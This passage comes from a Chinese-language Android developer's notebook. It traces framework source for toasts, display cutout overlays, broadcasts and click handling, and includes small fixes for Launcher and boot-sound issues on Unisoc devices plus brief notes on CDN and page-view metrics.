        final boolean appIsForeground = mActivityManager.getUidImportance(callingUid)
                == IMPORTANCE_FOREGROUND;
        if (ENABLE_BLOCKED_TOASTS && !isSystemToast && ((notificationsDisabledForPackage
                && !appIsForeground) || isPackageSuspended)) {
            Slog.e(TAG, "Suppressing toast from package " + pkg
                    + (isPackageSuspended ? " due to package suspended."
                    : " by user request."));
            return;
        }
    } finally {
        Binder.restoreCallingIdentity(callingIdentity);
    }

    synchronized (mToastQueue) {
        int callingPid = Binder.getCallingPid();
        long callingId = Binder.clearCallingIdentity();
        try {
            ToastRecord record;
            int index = indexOfToastLocked(pkg, callback);
            // If it's already in the queue, we update it in place, we don't
            // move it to the end of the queue.
            if (index >= 0) {
                record = mToastQueue.get(index);
                record.update(duration);
            } else {
                // Limit the number of toasts that any given package except the android
                // package can enqueue.  Prevents DOS attacks and deals with leaks.
                if (!isSystemToast) {
                    int count = 0;
                    final int N = mToastQueue.size();
                    for (int i=0; i<N; i++) {
                         final ToastRecord r = mToastQueue.get(i);
                         if (r.pkg.equals(pkg)) {
                             count++;
                             if (count >= MAX_PACKAGE_NOTIFICATIONS) {
                                 Slog.e(TAG, "Package has already posted " + count
                                        + " toasts. Not showing more. Package=" + pkg);
                                 return;
                             }
                         }
                    }
                }

                Binder token = new Binder();
                mWindowManagerInternal.addWindowToken(token, TYPE_TOAST, displayId);
                record = new ToastRecord(callingPid, pkg, callback, duration, token,
                        displayId);
                mToastQueue.add(record);
                index = mToastQueue.size() - 1;
                keepProcessAliveIfNeededLocked(callingPid);
            }
            // If it's at index 0, it's the current toast.  It doesn't matter if it's
            // new or just been updated.  Call back and tell it to show itself.
            // If the callback fails, this will remove it from the list, so don't
            // assume that it's valid after this.
            if (index == 0) {
                showNextToastLocked();
            }
        } finally {
            Binder.restoreCallingIdentity(callingId);
        }
    }
}
这个方法就是把要显示的 toast 添加到一个 mToastQueue 队列中，然后调用 showNextToastLocked() 依次显示下一个 toast

void showNextToastLocked() {
    ToastRecord record = mToastQueue.get(0);
    while (record != null) {
        if (DBG) Slog.d(TAG, "Show pkg=" + record.pkg + " callback=" + record.callback);
        try {
            record.callback.show(record.token);
            scheduleDurationReachedLocked(record);
            return;
        } catch (RemoteException e) {
            Slog.w(TAG, "Object died trying to show notification " + record.callback
                    + " in package " + record.pkg);
            // remove it from the list and let the process die
            int index = mToastQueue.indexOf(record);
            if (index >= 0) {
                mToastQueue.remove(index);
            }
            keepProcessAliveIfNeededLocked(record.pid);
            if (mToastQueue.size() > 0) {
                record = mToastQueue.get(0);
            } else {
                record = null;
            }
        }
    }
}
这个方法会从 mToastQueue 队列中依次取出第一个 toast 来显示

至此我们对 Toast 的整个流程已经有了一个清晰的认识，那么还有几个问题需要思考一下：
1.从代码中我们看到 toast 的显示时间 duration 只有两种情况，是否能控制 toast 的显示时间？使用反射能否实现？
2.能否通过命令显示一个 toast?
```

## [性能] Activity启动速度极限优化

```text
https://blog.csdn.net/long8313002/article/details/108470737

主线程避免耗时操作、建议异步化（异步化也会导致业务复杂度提高）
优化页面布局，减少多层嵌套、提高扁平度（难度大、收益低）
延迟加载不必要元素（大多数页面都没有懒加载条件）
避免过多的线程、推荐线程池
优化xml布局解析过程中反射创建View的耗时（略黑科技、通过复写onCreateView来实现手动创建View，减少了反射的耗时，实测效果微乎其微，现在反射已经很快了）
```

## [性能] android:directBootAware

```text
关于什么是DirectBoot模式，这里不再进行说明，具体内容可以阅读google官方的文档：

支持“直接启动”模式

在setting的AndroidManifest.xml里面，配置了DirectBoot模式，这样FallbackHome就会先于Launcher加载启动了
```

## 深度解析 Android Q cutout 刘海屏设置流程

```text
1.在 Settings/System/Developer options/DRAWING 里面看到有 "Display cutout" 菜单
2.根据这个字符串找到 packages/apps/Settings/res/values/strings.xml <string name="display_cutout_emulation">Display cutout</string>
3.然后根据 display_cutout_emulation 字符串找到在 packages/apps/Settings/res/xml/development_settings.xml 文件中有使用
<ListPreference
    android:key="display_cutout_emulation"
    android:title="@string/display_cutout_emulation"
    settings:keywords="@string/display_cutout_emulation_keywords" />
4.根据 display_cutout_emulation 这个 key 找到 packages/apps/Settings/src/com/android/settings/development/EmulateDisplayCutoutPreferenceController.java
public class EmulateDisplayCutoutPreferenceController extends OverlayCategoryPreferenceController {

    private static final String KEY = "display_cutout_emulation";

    @VisibleForTesting
    EmulateDisplayCutoutPreferenceController(Context context, PackageManager packageManager,
            IOverlayManager overlayManager) {
        super(context, packageManager, overlayManager, DisplayCutout.EMULATION_OVERLAY_CATEGORY);
    }

    public EmulateDisplayCutoutPreferenceController(Context context) {
        this(context, context.getPackageManager(), IOverlayManager.Stub
                .asInterface(ServiceManager.getService(Context.OVERLAY_SERVICE)));
    }

    @Override
    public String getPreferenceKey() {
        return KEY;
    }
}

其中有个重要的参数
DisplayCutout.EMULATION_OVERLAY_CATEGORY    这个参数是用来过滤和匹配 cutout_emulation 模拟apk的

找到 DisplayCutout 类如下：
frameworks/base/core/java/android/view/DisplayCutout.java
public static final String EMULATION_OVERLAY_CATEGORY = "com.android.internal.display_cutout_emulation";

用 OpenGrok 找到代码中有如下几个应用是有这个 category 的
frameworks/base/packages/overlays/DisplayCutoutEmulationTallOverlay/AndroidManifest.xml
frameworks/base/packages/overlays/DisplayCutoutEmulationWideOverlay/AndroidManifest.xml
frameworks/base/packages/overlays/DisplayCutoutEmulationCornerOverlay/AndroidManifest.xml
frameworks/base/packages/overlays/DisplayCutoutEmulationNarrowOverlay/AndroidManifest.xml
frameworks/base/packages/overlays/DisplayCutoutEmulationDoubleOverlay/AndroidManifest.xml

具体使用代码如下
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
        package="com.android.internal.display.cutout.emulation.tall"
        android:versionCode="1"
        android:versionName="1.0">
    <overlay android:targetPackage="android"
            android:category="com.android.internal.display_cutout_emulation"
            android:priority="1"/>

    <application android:label="@string/display_cutout_emulation_overlay" android:hasCode="false"/>
</manifest>

代码中的过滤方法在 packages/apps/Settings/src/com/android/settings/development/OverlayCategoryPreferenceController.java 类中，具体代码如下：
private List<OverlayInfo> getOverlayInfos() {
    final List<OverlayInfo> filteredInfos = new ArrayList<>();
    try {
        List<OverlayInfo> overlayInfos = mOverlayManager
                .getOverlayInfosForTarget(OVERLAY_TARGET_PACKAGE, USER_SYSTEM);
        for (OverlayInfo overlayInfo : overlayInfos) {
            if (mCategory.equals(overlayInfo.category)) {
                filteredInfos.add(overlayInfo);
            }
        }
    } catch (RemoteException re) {
        throw re.rethrowFromSystemServer();
    }
    filteredInfos.sort(OVERLAY_INFO_COMPARATOR);
    return filteredInfos;
}

找到 DisplayCutoutEmulationTallOverlay 对应代码
首先是 Android.mk 文件，这个文件没什么特别的，只有就 LOCAL_RRO_THEME 这个变量
frameworks/base/packages/overlays/DisplayCutoutEmulationTallOverlay/Android.mk
LOCAL_PATH:= $(call my-dir)
include $(CLEAR_VARS)
LOCAL_RRO_THEME := DisplayCutoutEmulationCorner
LOCAL_PRODUCT_MODULE := true
LOCAL_SRC_FILES := $(call all-subdir-java-files)
LOCAL_RESOURCE_DIR := $(LOCAL_PATH)/res
LOCAL_PACKAGE_NAME := DisplayCutoutEmulationCornerOverlay
LOCAL_SDK_VERSION := current
include $(BUILD_RRO_PACKAGE)

这个变量的定义在 build/make/core/build_rro_package.mk 文件中，代码如下
#############################################################################
## Standard rules for installing runtime resouce overlay APKs.
##
## Set LOCAL_RRO_THEME to the theme name if the package should apply only to
## a particular theme as set by ro.boot.vendor.overlay.theme system property.
##
## If LOCAL_RRO_THEME is not set, the package will apply always, independent
## of themes.
##
#############################################################################

LOCAL_IS_RUNTIME_RESOURCE_OVERLAY := true

ifneq ($(strip $(LOCAL_SRC_FILES)),)
  $(error runtime resource overlay package should not contain sources)
endif

partition :=
ifeq ($(strip $(LOCAL_ODM_MODULE)),true)
  partition := $(TARGET_OUT_ODM)
else ifeq ($(strip $(LOCAL_VENDOR_MODULE)),true)
  partition := $(TARGET_OUT_VENDOR)
else ifeq ($(strip $(LOCAL_PRODUCT_SERVICES_MODULE)),true)
  partition := $(TARGET_OUT_PRODUCT_SERVICES)
else
  partition := $(TARGET_OUT_PRODUCT)
endif

ifeq ($(LOCAL_RRO_THEME),)
  LOCAL_MODULE_PATH := $(partition)/overlay
else
  LOCAL_MODULE_PATH := $(partition)/overlay/$(LOCAL_RRO_THEME)
endif

partition :=

include $(BUILD_SYSTEM)/package.mk

另一个是 config.xml 文件，这个文件是定义刘海屏的参数的
frameworks/base/packages/overlays/DisplayCutoutEmulationTallOverlay/res/values/config.xml
<resources xmlns:xliff="urn:oasis:names:tc:xliff:document:1.2">
    <string translatable="false" name="config_mainBuiltInDisplayCutout">
        M 0,0
        L -48, 0
        L -44.3940446283, 36.0595537175
        C -43.5582133885, 44.4178661152 -39.6, 48.0 -31.2, 48.0
        L 31.2, 48.0
        C 39.6, 48.0 43.5582133885, 44.4178661152 44.3940446283, 36.0595537175
        L 48, 0
        Z
        @dp
    </string>
    <string translatable="false" name="config_mainBuiltInDisplayCutoutRectApproximation">@*android:string/config_mainBuiltInDisplayCutout</string>
    <bool name="config_fillMainBuiltInDisplayCutout">true</bool>
    <dimen name="status_bar_height_portrait">48dp</dimen>
    <dimen name="status_bar_height_landscape">28dp</dimen>
    <dimen name="quick_qs_offset_height">48dp</dimen>
    <dimen name="quick_qs_total_height">176dp</dimen>
</resources>

其中 config_mainBuiltInDisplayCutout 就是刘海屏的 svg 代码

5.但是 EmulateDisplayCutoutPreferenceController 文件中并没有相关的设置逻辑代码，那我猜想应该是在父类中处理的，于是找到 packages/apps/Settings/src/com/android/settings/development/OverlayCategoryPreferenceController.java

看到 onPreferenceChange 中是调用 setOverlay() 方法去设置水滴屏效果的
private boolean setOverlay(String packageName) {
    final String currentPackageName = getOverlayInfos().stream()
            .filter(info -> info.isEnabled())
            .map(info -> info.packageName)
            .findFirst()
            .orElse(null);

    if (PACKAGE_DEVICE_DEFAULT.equals(packageName) && TextUtils.isEmpty(currentPackageName)
            || TextUtils.equals(packageName, currentPackageName)) {
        // Already set.
        return true;
    }

    new AsyncTask<Void, Void, Boolean>() {
        @Override
        protected Boolean doInBackground(Void... params) {
            try {
                if (PACKAGE_DEVICE_DEFAULT.equals(packageName)) {
                    return mOverlayManager.setEnabled(currentPackageName, false, USER_SYSTEM);
                } else {
                    return mOverlayManager.setEnabledExclusiveInCategory(packageName,
                            USER_SYSTEM);
                }
            } catch (RemoteException re) {
                Log.w(TAG, "Error enabling overlay.", re);
                return false;
            }
        }

        @Override
        protected void onPostExecute(Boolean success) {
            updateState(mPreference);
            if (!success) {
                Toast.makeText(
                        mContext, R.string.overlay_toast_failed_to_apply, Toast.LENGTH_LONG)
                        .show();
            }
        }
    }.execute();

    return true; // Assume success; toast on failure.
}

其中最关键的方法如下
mOverlayManager.setEnabledExclusiveInCategory(packageName, USER_SYSTEM);

mOverlayManager = IOverlayManager.Stub.asInterface(ServiceManager.getService(Context.OVERLAY_SERVICE))

找到对应的 IOverlayManager.aidl 文件如下
frameworks/base/core/java/android/content/om/IOverlayManager.aidl

找到对应的服务
frameworks/base/services/core/java/com/android/server/om/OverlayManagerService.java

找到里面的 setEnabledExclusiveInCategory() 方法实现，发现最终是 mImpl.setEnabledExclusive() 方法的
@Override
public boolean setEnabledExclusiveInCategory(@Nullable String packageName, int userId)
        throws RemoteException {
    try {
        traceBegin(TRACE_TAG_RRO, "OMS#setEnabledExclusiveInCategory " + packageName);
        enforceChangeOverlayPackagesPermission("setEnabledExclusiveInCategory");
        userId = handleIncomingUser(userId, "setEnabledExclusiveInCategory");
        if (packageName == null) {
            return false;
        }

        final long ident = Binder.clearCallingIdentity();
        try {
            synchronized (mLock) {
                return mImpl.setEnabledExclusive(packageName, true /* withinCategory */,
                        userId);
            }
        } finally {
            Binder.restoreCallingIdentity(ident);
        }
    } finally {
        traceEnd(TRACE_TAG_RRO);
    }
}

找到最终的实现类 OverlayManagerServiceImpl
frameworks/base/services/core/java/com/android/server/om/OverlayManagerServiceImpl.java

看到 setEnabledExclusive() 方法如下
boolean setEnabledExclusive(@NonNull final String packageName, boolean withinCategory,
        final int userId) {
    if (DEBUG) {
        Slog.d(TAG, String.format("setEnabledExclusive packageName=%s"
                + " withinCategory=%s userId=%d", packageName, withinCategory, userId));
    }

    final PackageInfo overlayPackage = mPackageManager.getPackageInfo(packageName, userId);
    if (overlayPackage == null) {
        return false;
    }

    try {
        final OverlayInfo oi = mSettings.getOverlayInfo(packageName, userId);
        final String targetPackageName = oi.targetPackageName;

        List<OverlayInfo> allOverlays = getOverlayInfosForTarget(targetPackageName, userId);

        boolean modified = false;

        // Disable all other overlays.
        allOverlays.remove(oi);
        for (int i = 0; i < allOverlays.size(); i++) {
            final String disabledOverlayPackageName = allOverlays.get(i).packageName;
            final PackageInfo disabledOverlayPackageInfo = mPackageManager.getPackageInfo(
                    disabledOverlayPackageName, userId);
            if (disabledOverlayPackageInfo == null) {
                modified |= mSettings.remove(disabledOverlayPackageName, userId);
                continue;
            }

            if (disabledOverlayPackageInfo.isStaticOverlayPackage()) {
                // Don't touch static overlays.
                continue;
            }
            if (withinCategory && !Objects.equals(disabledOverlayPackageInfo.overlayCategory,
                    oi.category)) {
                // Don't touch overlays from other categories.
                continue;
            }

            // Disable the overlay.
            modified |= mSettings.setEnabled(disabledOverlayPackageName, userId, false);
            modified |= updateState(targetPackageName, disabledOverlayPackageName, userId, 0);
        }

        // Enable the selected overlay.
        modified |= mSettings.setEnabled(packageName, userId, true);
        modified |= updateState(targetPackageName, packageName, userId, 0);

        if (modified) {
            mListener.onOverlaysChanged(targetPackageName, userId);
        }
        return true;
    } catch (OverlayManagerSettings.BadKeyException e) {
        return false;
    }
}
从注释中可以看到会先去 Disable all other overlays 然后再 Enable the selected overlay，调用的是 mSettings.setEnabled() 方法

关键的方法是 mListener.onOverlaysChanged(targetPackageName, userId);
这个方法的具体实现在 OverlayManagerService.java 文件中，代码如下：
private final class OverlayChangeListener
        implements OverlayManagerServiceImpl.OverlayChangeListener {
    @Override
    public void onOverlaysChanged(@NonNull final String targetPackageName, final int userId) {
        schedulePersistSettings();
        FgThread.getHandler().post(() -> {
            updateAssets(userId, targetPackageName);

            final Intent intent = new Intent(Intent.ACTION_OVERLAY_CHANGED,
                    Uri.fromParts("package", targetPackageName, null));
            intent.setFlags(Intent.FLAG_RECEIVER_REGISTERED_ONLY_BEFORE_BOOT);

            if (DEBUG) {
                Slog.d(TAG, "send broadcast " + intent);
            }

            try {
                ActivityManager.getService().broadcastIntent(null, intent, null, null, 0,
                        null, null, null, android.app.AppOpsManager.OP_NONE, null, false, false,
                        userId);
            } catch (RemoteException e) {
                // Intentionally left empty.
            }
        });
    }
}

关键方法 ActivityManager.getService().broadcastIntent(null, intent, null, null, 0, null, null, null, android.app.AppOpsManager.OP_NONE, null, false, false, userId);

从 frameworks/base/packages/overlays/Android.mk 文件中看到 overlays 包下所有的 Overlay 都是在 frameworks-base-overlays 模块中的，如果要移除这些 overlay 模块只需要把 frameworks-base-overlays 模块移除即可
LOCAL_PATH:= $(call my-dir)
include $(CLEAR_VARS)

LOCAL_MODULE := frameworks-base-overlays
LOCAL_REQUIRED_MODULES := \
 AccentColorBlackOverlay \
 AccentColorCinnamonOverlay \
 AccentColorOceanOverlay \
 AccentColorOrchidOverlay \
 AccentColorSpaceOverlay \
 AccentColorGreenOverlay \
 AccentColorPurpleOverlay \
 DisplayCutoutEmulationCornerOverlay \
 DisplayCutoutEmulationDoubleOverlay \
 DisplayCutoutEmulationTallOverlay \
 FontNotoSerifSourceOverlay \
 IconPackCircularAndroidOverlay \
 IconPackCircularLauncherOverlay \
 IconPackCircularSettingsOverlay \
 IconPackCircularSystemUIOverlay \
 IconPackCircularThemePickerOverlay \
 IconPackFilledAndroidOverlay \
 IconPackFilledLauncherOverlay \
 IconPackFilledSettingsOverlay \
 IconPackFilledSystemUIOverlay \
 IconPackFilledThemePickerOverlay \
 IconPackRoundedAndroidOverlay \
 IconPackRoundedLauncherOverlay \
 IconPackRoundedSettingsOverlay \
 IconPackRoundedSystemUIOverlay \
 IconPackRoundedThemePickerUIOverlay \
 IconShapeRoundedRectOverlay \
 IconShapeSquareOverlay \
 IconShapeSquircleOverlay \
 IconShapeTeardropOverlay \
 NavigationBarMode3ButtonOverlay \
 NavigationBarMode2ButtonOverlay \
 NavigationBarModeGesturalOverlay \
 NavigationBarModeGesturalOverlayNarrowBack \
 NavigationBarModeGesturalOverlayWideBack \
 NavigationBarModeGesturalOverlayExtraWideBack

include $(BUILD_PHONY_PACKAGE)
include $(CLEAR_VARS)

LOCAL_MODULE := frameworks-base-overlays-debug

include $(BUILD_PHONY_PACKAGE)
include $(call first-makefiles-under,$(LOCAL_PATH))

frameworks-base-overlays 这个模块的控制在 build/make/target/product/handheld_product.mk 文件中
$(call inherit-product, $(SRC_TARGET_DIR)/product/media_product.mk)

# /product packages
PRODUCT_PACKAGES += \
    Calendar \
    Camera2 \
    Contacts \
    DeskClock \
    Email \
    Gallery2 \
    LatinIME \
    Launcher3QuickStep \
    Music \
    OneTimeInitializer \
    Provision \
    QuickSearchBox \
    Settings \
    SettingsIntelligence \
    StorageManager \
    SystemUI \
    WallpaperCropper \
    frameworks-base-overlays

PRODUCT_PACKAGES_DEBUG += \
    frameworks-base-overlays-debug

以上是 RRO 刘海屏的相关代码流程，如果要用 SRO 只需要参考壁纸等的 overlay 方法即可，在我们的展锐项目上代码如下，关键是 config_mainBuiltInDisplayCutout 这个刘海屏 svg 图
device/sprd/pike2/xxx/yyy/frameworks/base/core/res/res/values/config.xml
<resources xmlns:xliff="urn:oasis:names:tc:xliff:document:1.2">
    <string translatable="false" name="config_mainBuiltInDisplayCutout">
        M 0,0
        L -33, 0
        L 0, 22
        L 33, 0
        Z
        @dp
    </string>
    <string translatable="false" name="config_mainBuiltInDisplayCutoutRectApproximation">@*android:string/config_mainBuiltInDisplayCutout</string>
    <!-- Whether the display cutout region of the main built-in display should be forced to
         black in software (to avoid aliasing or emulate a cutout that is not physically existent).
     -->
    <bool name="config_fillMainBuiltInDisplayCutout">true</bool>
</resources>

然后把这个 overlay 路径添加到 device/sprd/pike2/xxx/sp7731e_1h10_native.mk 文件
DEVICE_PACKAGE_OVERLAYS += $(BOARDDIR)/overlay_SP652_AH6521_Mobicel

因为我们项目上的刘海屏是一个小水滴，所以我把 config_mainBuiltInDisplayCutout 这个 svg 用了一个近似三角形的路径进行替换

目前项目上出现一个问题是添加了刘海屏打电话的时候亮灭屏会出现概率性状态栏上的图标消失的情况，这个应该不是 config_mainBuiltInDisplayCutout 这些 overlay 的问题，而是刘海屏本身的问题，还有待研究
```

## [知识点] CDN

```text
CDN 的全称是 Content Delivery Network，即内容分发网络。其目的是通过在现有的 Internet 中增加一层新的网络架构，将网站的内容发布到最接近用户的网络“边缘”，使用户可以就近取得所需的内容，提高用户访问网站的响应速度。CDN 有别于镜像，因为它比镜像更智能，或者可以做这样一个比喻：CDN=更智能的镜像+缓存+流量导流。因而，CDN 可以明显提高 Internet 网络中信息流动的效率。从技术上全面解决由于网络带宽小、用户访问量大、网点分布不均等问题，提高用户访问网站的响应速度。
```

## ImageView src background foreground

```text
通过src设置图片
final Drawable d = a.getDrawable(R.styleable.ImageView_src);
if (d != null) {
    setImageDrawable(d);
}
public void setImageDrawable(@Nullable Drawable drawable) {
    if (mDrawable != drawable) {
        mResource = 0;
        mUri = null;

        final int oldWidth = mDrawableWidth;
        final int oldHeight = mDrawableHeight;

        updateDrawable(drawable);

        if (oldWidth != mDrawableWidth || oldHeight != mDrawableHeight) {
            requestLayout();
        }
        invalidate();
    }
}
```

## sendBroadcast的流程

```text
frameworks/base/core/java/android/app/ContextImpl.java
@Override
public void sendBroadcast(Intent intent) {
    warnIfCallingFromSystemProcess();
    String resolvedType = intent.resolveTypeIfNeeded(getContentResolver());
    try {
        intent.prepareToLeaveProcess(this);
        ActivityManager.getService().broadcastIntent(
                mMainThread.getApplicationThread(), intent, resolvedType, null,
                Activity.RESULT_OK, null, null, null, AppOpsManager.OP_NONE, null, false, false,
                getUserId());
    } catch (RemoteException e) {
        throw e.rethrowFromSystemServer();
    }
}

frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.java
public final int broadcastIntent(IApplicationThread caller,
        Intent intent, String resolvedType, IIntentReceiver resultTo,
        int resultCode, String resultData, Bundle resultExtras,
        String[]  requiredPermissions, int appOp, Bundle bOptions,
        boolean serialized, boolean sticky, int userId) {
    enforceNotIsolatedCaller("broadcastIntent");
    synchronized(this) {
        intent = verifyBroadcastLocked(intent);

        final ProcessRecord callerApp = getRecordForAppLocked(caller);
        final int callingPid = Binder.getCallingPid();
        final int callingUid = Binder.getCallingUid();

        final long origId = Binder.clearCallingIdentity();
        try {
            return broadcastIntentLocked(callerApp,
                    callerApp != null ? callerApp.info.packageName : null,
                    intent, resolvedType, resultTo, resultCode, resultData, resultExtras,
                    requiredPermissions, appOp, bOptions, serialized, sticky,
                    callingPid, callingUid, callingUid, callingPid, userId);
        } finally {
            Binder.restoreCallingIdentity(origId);
        }
    }
}
```

## 深度解析 View.setOnClickListener

```text
public void setOnClickListener(@Nullable OnClickListener l) {
    if (!isClickable()) {
        setClickable(true);
    }
    getListenerInfo().mOnClickListener = l;
}

然后会在 performClick() 和 callOnClick() 方法中调用 li.mOnClickListener.onClick 来执行点击方法，这两个方法的区别在 callOnClick() 方法的注释中
public boolean performClick() {
    // We still need to call this method to handle the cases where performClick() was called
    // externally, instead of through performClickInternal()
    notifyAutofillManagerOnClick();

    final boolean result;
    final ListenerInfo li = mListenerInfo;
    if (li != null && li.mOnClickListener != null) {
        playSoundEffect(SoundEffectConstants.CLICK);
        li.mOnClickListener.onClick(this);
        result = true;
    } else {
        result = false;
    }
    if (sDebugDispatchInput) {
        Log.d(VIEW_LOG_TAG, "performClick result is: " + result + ", app's view is: " + this);
    }
    sendAccessibilityEvent(AccessibilityEvent.TYPE_VIEW_CLICKED);

    notifyEnterOrExitForAutoFillIfNeeded(true);

    return result;
}

/**
 * Directly call any attached OnClickListener.  Unlike {@link #performClick()},
 * this only calls the listener, and does not do any associated clicking
 * actions like reporting an accessibility event.
 *
 * @return True there was an assigned OnClickListener that was called, false
 *         otherwise is returned.
 */
public boolean callOnClick() {
    ListenerInfo li = mListenerInfo;
    if (li != null && li.mOnClickListener != null) {
        li.mOnClickListener.onClick(this);
        return true;
    }
    return false;
}

然后会在 onTouchEvent() 的 ACTION_UP 调用 performClickInternal()
public boolean onTouchEvent(MotionEvent event) {
    ...
    if (clickable || (viewFlags & TOOLTIP) == TOOLTIP) {
        switch (action) {
            case MotionEvent.ACTION_UP:
                ...
                if (mPerformClick == null) {
                    mPerformClick = new PerformClick();
                }
                if (!post(mPerformClick)) {
                    performClickInternal();
                }
                ...
    ...
    return false;
}

public boolean post(Runnable action) {
    final AttachInfo attachInfo = mAttachInfo;
    if (attachInfo != null) {
        return attachInfo.mHandler.post(action);
    }

    // Postpone the runnable until we know on which thread it needs to run.
    // Assume that the runnable will be successfully placed after attach.
    getRunQueue().post(action);
    return true;
}

mAttachInfo 这个东西只有在 dispatchAttachedToWindow() 方法中赋值

private final class PerformClick implements Runnable {
    @Override
    public void run() {
        recordGestureClassification(TOUCH_GESTURE_CLASSIFIED__CLASSIFICATION__SINGLE_TAP);
        performClickInternal();
    }
}
```

## 深度解析 View.setOnLongClickListener

```text
frameworks/base/core/java/android/view/View.java
case MotionEvent.ACTION_DOWN:
    ...
    checkForLongClick(
        ViewConfiguration.getLongPressTimeout(),
        x,
        y,
        TOUCH_GESTURE_CLASSIFIED__CLASSIFICATION__LONG_PRESS);
    ...

frameworks/base/core/java/android/view/ViewConfiguration.java
public static int getKeyRepeatTimeout() {
    return getLongPressTimeout();
}

public static int getLongPressTimeout() {
    return AppGlobals.getIntCoreSetting(Settings.Secure.LONG_PRESS_TIMEOUT,
            DEFAULT_LONG_PRESS_TIMEOUT);
}

frameworks/base/core/java/android/app/AppGlobals.java
public static int getIntCoreSetting(String key, int defaultValue) {
    ActivityThread currentActivityThread = ActivityThread.currentActivityThread();
    if (currentActivityThread != null) {
        return currentActivityThread.getIntCoreSetting(key, defaultValue);
    } else {
        return defaultValue;
    }
}
```

## Android模拟点击延迟解决方法

```text
package com.android.dev.util;
import android.graphics.Point;
import java.io.OutputStream;
/**
 * 用root权限执行Linux下的Shell指令
 */
public class RootShellCmd {
    private static Process process;
    private static OutputStream os;
    /**
     * 执行shell指令
     *
     * @param cmd 指令
     */
    public static final void exec(String cmd) {
        try {
            if (process == null) {
                process = Runtime.getRuntime().exec("su");
                os = process.getOutputStream();
            }
            os.write(cmd.getBytes());
            os.flush();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    /**
     * 后台执行一次按键
     *
     * @param keyCode
     */
    public static final void simulateKey(int keyCode) {
        exec(String.format("input keyevent %d &\n", keyCode));
    }
    /**
     * 后台执行一次点击
     *
     * @param point
     */
    public static final void simulateClick(Point point) {
        exec(String.format("input tap %d %d &\n", point.x, point.y));
    }
}
```

## [sprd] 默认没有开机铃声的项目(persist.sys.bootanim.play_sound=0)，会概率性出现开机铃声

```text
frameworks/base/services/core/java/com/android/server/audio/AudioService.java
public void mute(boolean state) {
    boolean changed = false;
    synchronized (VolumeStreamState.class) {
        if (state != mIsMuted) {
            changed = true;
            mIsMuted = state;

            // Set the new mute volume. This propagates the values to
            // the audio system, otherwise the volume won't be changed
            // at the lower level.
            sendMsg(mAudioHandler,
                    MSG_SET_ALL_VOLUMES,
                    SENDMSG_QUEUE,
                    0,
                    0,
                    this, 0);
        }
    }
    if (changed) {
        // Stream mute changed, fire the intent.
        Intent intent = new Intent(AudioManager.STREAM_MUTE_CHANGED_ACTION);
        intent.putExtra(AudioManager.EXTRA_VOLUME_STREAM_TYPE, mStreamType);
        intent.putExtra(AudioManager.EXTRA_STREAM_VOLUME_MUTED, state);
        sendBroadcastToAll(intent);

        //UNISOC bug1169215 use property to tell the bootanimation
        if (mStreamType == AudioSystem.STREAM_SYSTEM) {
            if (state) {
                SystemProperties.set(PROPERTY_BOOT_SOUNDS, "0");
            } else {
                SystemProperties.set(PROPERTY_BOOT_SOUNDS, "1");    //在这里把 persist.sys.bootanim.play_sound 设置为了1
            }
        }
    }
}
查看代码之后发现把系统音量设置为静音之后会把 persist.sys.bootanim.play_sound 重新设置为 1，从而导致会出现开机铃声
把系统声音设置为静音之后复现，修改方法：去掉 bootanimation.mk 中的 bootsound.mp3 和 shutdownsound.mp3 即可
```

## 在 HierarchyView 中显示自定义的属性

```text
packages/apps/Launcher3/src/com/android/launcher3/dot/FolderDotInfo.java
@ViewDebug.ExportedProperty(category = "launcher")
public boolean hasDot() {
    return mNumNotifications > 0;
}
```

## [sprd] 修改 Launcher 上文件夹图标的大小

```text
packages/apps/Launcher3/src/com/android/launcher3/DeviceProfile.java

folderIconSizePx = IconNormalizer.getNormalizedCircleSize(iconSizePx) - 10;
```

## [sprd] 在 Launcher 上添加时钟 widget

```text
vendor/partner_gms/apps/GmsSampleIntegration/res_dhs_go/xml/partner_default_layout.xml

<appwidget screen="0" x="0" y="2" packageName="com.android.deskclock" className="com.android.alarmclock.DigitalAppWidgetProvider" spanX="4" spanY="2" />

这个文件的解析过程在 DefaultLayoutParser 类中
packages/apps/Launcher3/src/com/android/launcher3/DefaultLayoutParser.java

对 widget 的解析在 DefaultLayoutParser.AppWidgetParser 类中
```

## android获取进程名函数，如何优化到极致？

```text
public class ProcessUtil {
  private static String currentProcessName;

  /**
  * @return 当前进程名
  */
  @Nullable
  public static String getCurrentProcessName(@NonNull Context context) {
    if (!TextUtils.isEmpty(currentProcessName)) {
      return currentProcessName;
    }

    //1)通过Application的API获取当前进程名
    currentProcessName = getCurrentProcessNameByApplication();
    if (!TextUtils.isEmpty(currentProcessName)) {
      return currentProcessName;
    }

    //2)通过反射ActivityThread获取当前进程名
    currentProcessName = getCurrentProcessNameByActivityThread();
    if (!TextUtils.isEmpty(currentProcessName)) {
      return currentProcessName;
    }

    //3)通过ActivityManager获取当前进程名
    currentProcessName = getCurrentProcessNameByActivityManager(context);

    return currentProcessName;
  }

  /**
  * 通过Application新的API获取进程名，无需反射，无需IPC，效率最高。
  */
  public static String getCurrentProcessNameByApplication() {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
      return Application.getProcessName();
    }
    return null;
  }

  /**
  * 通过反射ActivityThread获取进程名，避免了ipc
  */
  public static String getCurrentProcessNameByActivityThread() {
    String processName = null;
    try {
      final Method declaredMethod = Class.forName("android.app.ActivityThread", false, Application.class.getClassLoader())
        .getDeclaredMethod("currentProcessName", (Class<?>[] ) new Class[0] );
      declaredMethod.setAccessible(true);
      final Object invoke = declaredMethod.invoke(null, new Object[0] );
      if (invoke instanceof String) {
        processName = (String) invoke;
      }
    } catch (Throwable e) {
      e.printStackTrace();
    }
    return processName;
  }

  /**
  * 通过ActivityManager 获取进程名，需要IPC通信
  */
  public static String getCurrentProcessNameByActivityManager(@NonNull Context context) {
    if (context == null) {
      return null;
    }
    int pid = Process.myPid();
    ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
    if (am != null) {
      List<ActivityManager.RunningAppProcessInfo> runningAppList = am.getRunningAppProcesses();
      if (runningAppList != null) {
        for (ActivityManager.RunningAppProcessInfo processInfo : runningAppList) {
          if (processInfo.pid == pid) {
            return processInfo.processName;
          }
        }
      }
    }
    return null;
  }
}
```

## [知识点] 一文搞懂PV、UV、VV、IP及其关系与计算

```text
什么是PV？
PV即Page View，网站浏览量，指页面浏览的次数，用以衡量网站用户访问的网页数量。 
